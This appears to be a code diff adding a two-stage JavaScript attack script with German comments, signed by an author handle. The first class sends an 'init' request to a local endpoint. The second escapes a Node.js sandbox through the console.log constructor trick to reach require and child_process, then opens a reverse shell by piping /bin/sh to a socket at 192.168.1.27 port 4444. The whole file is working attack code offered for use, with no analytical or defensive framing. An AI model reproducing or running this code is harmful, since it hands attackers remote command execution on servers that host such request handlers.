@@ -1,0 +1,39 @@
+// Schritt 1: Anfrage initialisieren
+class ScriptPart1 {
+  process_incoming_request({ request }) {
+    const payload = {
+      attack_step: 'init'
+    };
+    // Beispiel: Payload splitten und an den nächsten Schritt senden
+    fetch('http://localhost:13000/attack/step2', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload),
+    });
+    return { message: 'Attack initiated' };
+  }
+}
+
+
+// Schritt 2: Reverse-Shell auslösen
+class ScriptPart2 {
+  process_incoming_request({ request }) {
+    if (request.body.attack_step === 'init') {
+      const require = console.log.constructor('return process.mainModule.require')();
+      const { execSync } = require('child_process');
+      var net = require("net"),
+          cp = require("child_process"),
+          sh = cp.spawn("/bin/sh", []);
+      var client = new net.Socket();
+      client.connect(4444, "192.168.1.27", function() {
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+      });
+    }
+    return {}
+  }
+}
+
+
+//By DaUfooo 2025
